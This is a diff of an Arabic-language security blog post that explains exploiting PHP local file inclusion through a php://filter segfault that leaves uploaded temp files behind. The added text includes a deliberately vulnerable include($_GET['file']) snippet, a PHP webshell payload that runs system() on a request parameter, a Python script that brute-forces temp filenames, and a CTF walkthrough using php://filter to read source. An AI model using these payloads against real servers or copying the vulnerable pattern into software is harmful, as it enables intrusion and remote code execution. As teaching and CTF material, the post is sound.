@@ -89,7 +89,7 @@ https://www.macs.hw.ac.uk/~hwloidl/docs/PHP/features.file-upload.html
         
         <div class="info">
           <i class="fa fa-sun-o"></i><span class="date">Fri, Jul 10, 2020</span>
-          <i class="fa fa-clock-o"></i><span class="reading-time">4-minute read</span>
+          <i class="fa fa-clock-o"></i><span class="reading-time">6-minute read</span>
         </div>
         
         </div>
@@ -116,7 +116,7 @@ https://www.macs.hw.ac.uk/~hwloidl/docs/PHP/features.file-upload.html
 للسيرفر
 by default</p>
 <p>يمكنك ان تجده كالتالي في php.ini</p>
-<!-- raw HTML omitted -->
+<p><img src="/images/2020-07-10_105221.png" alt="Images"></p>
 <p>ملاحظة انا هنا قمت بتغييره الى d:/phpstudy_pro/temp</p>
 <p>قبل التعدلي عليه كان ; upload_tmp_dir</p>
 <p>اظن في wamp c:/wamp/tmp</p>
@@ -345,10 +345,188 @@ phpinfo() script</p>
 <p>docker container : <a href="https://github.com/vulhub/vulhub/tree/master/php/inclusion">https://github.com/vulhub/vulhub/tree/master/php/inclusion</a></p>
 <h1 id="-php7-segment-fault--using-phpfilterstringstrip_tags">( php7 segment fault ) using php://filter/string.strip_tags</h1>
 <!-- raw HTML omitted -->
-<p>الاصدارات المصابة</p>
-<p>هذه الطريقة
-php7.0.0 / 7.1.2</p>
-<p>php7.1.2*</p>
+<p>شروط الاستخدام اصدارات php التالية</p>
+<p>php7.0.0-7.1.2</p>
+<p>php7.1.3-7.2.1</p>
+<p>php7.2.2-7.2.8</p>
+<p>هناك ثغرة lfi
+يمكننا استعمال php://filter/string.strip_tags
+لجعل php
+يعمل crash</p>
+<p>اذا تم رفع ملف في نفس الوقت (يعني وقت حدوث الكراش)</p>
+<p>سيتم حفظ الملف المؤقت في upload_tmp_dir
+directory
+المحدد ، لذلك لن يتم حذفه ، وسيتم تخزينه دائمًا في الدليل المؤقت للخدمة.</p>
+<p>segment fault سبب حدوث الكراش
+null pointer refernce</p>
+<!-- raw HTML omitted -->
+<p>. <code>atoi(NULL)</code></p>
+<!-- raw HTML omitted -->
+<p>مثال</p>
+<p>هنا الاصدار لم يحدث شيء</p>
+<p><img src="2020-07-10_173120.png" alt="image"></p>
+<p>هنا حدث crash</p>
+<p><img src="2020-07-10_173327.png" alt="image"></p>
+<p>الان نرى</p>
+<!-- raw HTML omitted -->
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span>
+<span style="color:#66d9ef">include</span>($_GET[<span style="color:#e6db74">&#39;file&#39;</span>]);
+<span style="color:#75715e">?&gt;</span>
+</code></pre></div><!-- raw HTML omitted -->
+<p>الان نجرب في browser</p>
+<p>سوف نحصل على شيء مثل هذا</p>
+<p><img src="2020-07-10_172649.png" alt="image"></p>
+<p>من التحدي السابق</p>
+<p>فسنرى انه يقوم بحذف الملف دائما كما قمنا بالشرح فوق</p>
+<p><img src="/images/2020-07-10_153338.png" alt="Images"></p>
+<p><img src="/images/2020-07-10_1105391.png" alt="Images"></p>
+<p>نجرب الان</p>
+<p>نجرب نحمل اي ملف</p>
+<!-- raw HTML omitted -->
+<p>mtucx.txt</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span>
+<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;mtucx&#39;</span>;
+<span style="color:#a6e22e">system</span>($_GET[<span style="color:#e6db74">&#39;cmd&#39;</span>]);
+<span style="color:#f92672">&gt;</span>
+</code></pre></div><p><img src="2020-07-10_174146.png" alt="image"></p>
+<!-- raw HTML omitted -->
+<p>لو نرى هنا
+اين انا اضع رقم 2 فاننا نرى
+لم يقم بحذف الملف المؤقت
+بسبب crash</p>
+<p>كما قلنا في الشرح فوق</p>
+<p>نجرب</p>
+<p><img src="2020-07-10_174402.png" alt="image"></p>
+<p>تمام هنا انا عرف اسم tmp filename</p>
+<p>اذا لم نكن نعرف يمكننا ان نعمل تخمين على الملف</p>
+<p>يمكنك عمل سركبت لعمل ذلك او يمكنك استعمال burp wfuzz gobuster dirbuster &hellip; etc</p>
+<p>في البداية نجرب نرسل الكثير من الريكوست</p>
+<p>يمكنك عمل سكربت لذلك</p>
+<p><img src="2020-07-10_200751.png" alt="image"></p>
+<p>ارسل اكثر لتزيد فرص و سرعة التخمين
+المهم ارجو ان تكون فهمت مقصودي</p>
+<!-- raw HTML omitted -->
+<p>python script</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python</span>
+<span style="color:#75715e"># -*- coding: utf-8 -*-</span>
+
+<span style="color:#f92672">import</span> requests<span style="color:#f92672">,</span> random
+<span style="color:#f92672">import</span> datetime
+
+charset <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890&#34;</span>
+
+base_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://127.0.0.1&#34;</span>
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_filename</span>():
+    ret <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">6</span>):
+        ret <span style="color:#f92672">+=</span> random<span style="color:#f92672">.</span>choice(charset)
+    <span style="color:#66d9ef">return</span> ret
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">brute_force_tmp_files</span>():
+    filename <span style="color:#f92672">=</span> get_filename()
+    url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;{}/index.php?lfi=/tmp/php{}&#34;</span><span style="color:#f92672">.</span>format(base_url, filename)
+    <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;php&#34;</span> <span style="color:#f92672">+</span> filename
+    <span style="color:#66d9ef">try</span>:
+        r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url)
+        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;mtucx&#39;</span> <span style="color:#f92672">in</span> r<span style="color:#f92672">.</span>text:
+            <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;[+] Include success!&#34;</span>
+            <span style="color:#66d9ef">print</span> url
+            exit()
+    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+        <span style="color:#66d9ef">pass</span>
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+    flag <span style="color:#f92672">=</span> False
+    <span style="color:#66d9ef">while</span> <span style="color:#ae81ff">1</span>:
+        brute_force_tmp_files()
+        <span style="color:#66d9ef">pass</span>
+
+
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+    main()
+</code></pre></div><!-- raw HTML omitted -->
+<p>باستعمال burpsuite
+انا لا استعمل burpsuite في معظم الاحيان لكن بما ان كل الناس تستعملها اردت الشرح عليها</p>
+<p><img src="/images/2020-07-10_200156.png" alt="Images"></p>
+<p>راجع الجزء الخاص بالتسمية فوق</p>
+<p>بعد بضع ساعات او اشهر او اعوام &hellip;.</p>
+<p><img src="/images/2020-07-10_204834.png" alt="Images"></p>
+<h1 id="الان-ناتي-الى-مثال-ctf">الان ناتي الى مثال ctf</h1>
+<p>في البداية نعمل fuzzخفيف</p>
+<p><img src="/images/2020-07-10_191555.png" alt="Images"></p>
+<p>وجدنا انه هناك ملف dir.php
+سنعود اليه لاحقا</p>
+<p>نرى السورس الخاص بالصفحة</p>
+<p><img src="/images/2020-07-10_191636.png" alt="Images"></p>
+<p>نرى انه هناك
+اذا md5 للسيكرت و الاسم == الباسوورد</p>
+<p>pass=md5(??)&amp;</p>
+<p>نلاحظ ان هناك هاش في الكوكيز باسم هاش</p>
+<p><img src="/images/2020-07-10_191803.png" alt="Images"></p>
+<p>نرى الطول</p>
+<!-- raw HTML omitted -->
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\l</span>ol<span style="color:#ae81ff">\D</span>esktop<span style="color:#ae81ff">\f</span>fuf_1.0.2_windows_amd64&gt;python -c <span style="color:#e6db74">&#34;print len(&#39;fa25e54758d5d5c1927781a6ede89f8a&#39;)&#34;</span>
+<span style="color:#ae81ff">32</span>
+
+C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\l</span>ol<span style="color:#ae81ff">\D</span>esktop<span style="color:#ae81ff">\f</span>fuf_1.0.2_windows_amd64&gt;
+</code></pre></div><!-- raw HTML omitted -->
+<p>تمام الطول
+32 كما نعرف 32 == md5</p>
+<p>نجرب</p>
+<p><img src="/images/2020-07-10_192103.png" alt="Images"></p>
+<p>نلاحظ انه يعمل تحويل redirect للصفحة
+flflflflfag.php</p>
+<p>نجرب نراها</p>
+<p><img src="/images/2020-07-10_192159.png" alt="Images"></p>
+<p>اذا هناك lfi واضحة  هنا</p>
+<p>نجرب php://filter/convret.base64-encode/resource=</p>
+<!-- raw HTML omitted -->
+<pre><code>http://61da71ac-e4d7-4eac-96c2-58cbde529147.node3.buuoj.cn/flflflflag.php?file=php://filter/convert.base64-encode/resource=flflflflag.php
+
+http://61da71ac-e4d7-4eac-96c2-58cbde529147.node3.buuoj.cn/flflflflag.php?file=php://filter/convert.base64-encode/resource=dir.php
+
+</code></pre><!-- raw HTML omitted -->
+<p>نقوم بعمل decode ل base64</p>
+<!-- raw HTML omitted -->
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">flflflflag.php
+
+<span style="color:#75715e">&lt;?php</span>
+$file<span style="color:#f92672">=</span>$_GET[<span style="color:#e6db74">&#39;file&#39;</span>];
+<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/data|input|zip/is&#39;</span>,$file)){
+	<span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;nonono&#39;</span>);
+}
+<span style="color:#f92672">@</span><span style="color:#66d9ef">include</span>($file);
+<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;include($_GET[&#34;file&#34;])&#39;</span>;
+<span style="color:#75715e">?&gt;</span>
+
+dir.php
+
+<span style="color:#75715e">&lt;?php</span>
+<span style="color:#a6e22e">var_dump</span>(<span style="color:#a6e22e">scandir</span>(<span style="color:#e6db74">&#39;/tmp&#39;</span>));
+</code></pre></div><!-- raw HTML omitted -->
+<p><img src="/images/2020-07-10_191736.png" alt="Images"></p>
+<p>نجرب</p>
+<p>ما تعلمناه</p>
+<p><img src="/images/2020-07-10_192525.png" alt="Images"></p>
+<p>تمام نجرب</p>
+<p><img src="/images/2020-07-10_192556.png" alt="Images"></p>
+<p>نرى dir.php
+الان</p>
+<p><img src="/images/2020-07-10_192654.png" alt="Images"></p>
+<p>نعمل include للملف</p>
+<p><img src="/images/2020-07-10_192727.png" alt="Images"></p>
+<p>نرى disable function</p>
+<pre><code>disable_functions pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,scadnir,readfile,show_source,fpassthru,readdir 
+</code></pre><p>eval ليست غير مفعلة نجرب
+<img src="/images/2020-07-10_192923.png" alt="Images"></p>
+<p><img src="/images/2020-07-10_193037.png" alt="Images"></p>
+<p>المهم الفلاق موجود</p>
+<p><img src="/images/2020-07-10_193822.png" alt="Images"></p>
+<!-- raw HTML omitted -->
+<h1 id="3--convertquoted-printable-encode--segment-fault-">3 ( convert.quoted-printable-encode  segment fault )</h1>
+<p><a href="https://hackmd.io/@ZzDmROodQUynQsF9je3Q5Q/rJlfZva0m?type=view">https://hackmd.io/@ZzDmROodQUynQsF9je3Q5Q/rJlfZva0m?type=view</a></p>
 
     </div>
     <div class="post-footer">
